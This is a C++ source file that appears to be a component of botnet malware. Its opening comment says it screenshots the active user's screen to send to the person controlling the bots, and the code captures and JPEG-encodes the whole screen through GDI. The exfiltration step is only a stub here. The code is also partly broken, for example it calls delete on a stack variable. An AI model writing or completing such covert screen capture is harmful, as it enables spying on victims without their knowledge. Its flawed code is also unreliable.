//This tool will be used to screenshot the active users screen and then proceed to send it 
//over to the owner controlling the bots

//Windows headers 
#include <Windows.h>
#include <gdiplus.h>

#ifndef TIME
#define TIME
	#include "general_macro.hpp" //Has time function and sysinfoapi.h 
#else
	#include <time.h>
#endif

#include <iostream>
#include <cerrno> 
#include <memory>


//Thanks to https://gist.github.com/prashanthrajagopal/05f8ad157ece964d8c4d for original code
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
	//using namespace Gdiplus;
	UINT  num = 0;
	UINT  size = 0;

	//Work on InvalidImageTypes to filter what image types can be given
	//https://stackoverflow.com/questions/23813843/image-view-invalid-image-type
	const WCHAR* InvalidImageTypes[]{
		L"image/bmp",
		L"image/tiff",
	};

	Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;

	Gdiplus::GetImageEncodersSize(&num, &size);
	if (size == 0)
		return -1;

	pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
	if (pImageCodecInfo == NULL)
		return -1;

	GetImageEncoders(num, size, pImageCodecInfo);
	for (UINT j = 0; j < num; ++j)
	{
		if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
		{
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j;
		}
	}
	free(pImageCodecInfo);
	return 0;
}

//Work on a place to collectively store images 
void StoreImage() {

}

void gdiscreen() {
	//using namespace Gdiplus;
	IStream* istream;
	HRESULT res = CreateStreamOnHGlobal(NULL, true, &istream);
	Gdiplus::GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken;
	Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
	{
		HDC scrdc, memdc;
		HBITMAP membit;
		scrdc = ::GetDC(0);
		int Height = GetSystemMetrics(SM_CYSCREEN);
		int Width = GetSystemMetrics(SM_CXSCREEN);
		memdc = CreateCompatibleDC(scrdc);
		membit = CreateCompatibleBitmap(scrdc, Width, Height);
		HBITMAP hOldBitmap = (HBITMAP)SelectObject(memdc, membit);
		BitBlt(memdc, 0, 0, Width, Height, scrdc, 0, 0, SRCCOPY);

		Gdiplus::Bitmap bitmap(membit, NULL);
		CLSID clsid;
		GetEncoderClsid(L"image/jpeg", &clsid);

		bitmap.Save(istream, &clsid, NULL);
		delete& clsid;
		DeleteObject(memdc);
		DeleteObject(membit);
		::ReleaseDC(0, scrdc);
	}
	Gdiplus::GdiplusShutdown(gdiplusToken);
}
